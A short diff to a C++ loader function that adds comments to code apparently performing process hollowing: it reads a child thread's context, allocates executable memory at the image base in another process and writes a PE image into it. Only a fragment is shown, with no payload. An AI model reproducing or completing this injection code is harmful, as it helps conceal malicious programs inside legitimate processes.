@@ -60,12 +60,13 @@ void Loader::Execute(LPBYTE buff)
 		return;
 	}
 
-	CONTEXT* ctx;
-	ctx = LPCONTEXT(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE));
+	// Allocate memory for the context structure
+	CONTEXT* ctx = LPCONTEXT(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE));
 
+	// Set context flag to FULL 
 	ctx->ContextFlags = CONTEXT_FULL;
 
-
+	// Check if the context information for the thread was successfully obtained
 	if (!GetThreadContext(pi.hThread, ctx)){
 		DWORD error = GetLastError();
 		printf("[!] GetThreadContext end with error %lu\n", error);
@@ -74,6 +75,7 @@ void Loader::Execute(LPBYTE buff)
 		return;
 	}
 
+	// Pointer to the image base
 	LPVOID lpImageBase = VirtualAllocEx(
 		pi.hProcess,
 		(LPVOID)(pNtHdr->OptionalHeader.ImageBase),
@@ -90,6 +92,7 @@ void Loader::Execute(LPBYTE buff)
 		return;
 	}
 
+	// Write the image to the process
 	if (!WriteProcessMemory(pi.hProcess,lpImageBase,buff,pNtHdr->OptionalHeader.SizeOfHeaders,NULL)){
 		DWORD error = GetLastError();
 		printf("[!] WriteProcessMemory end with error %lu\n", error);
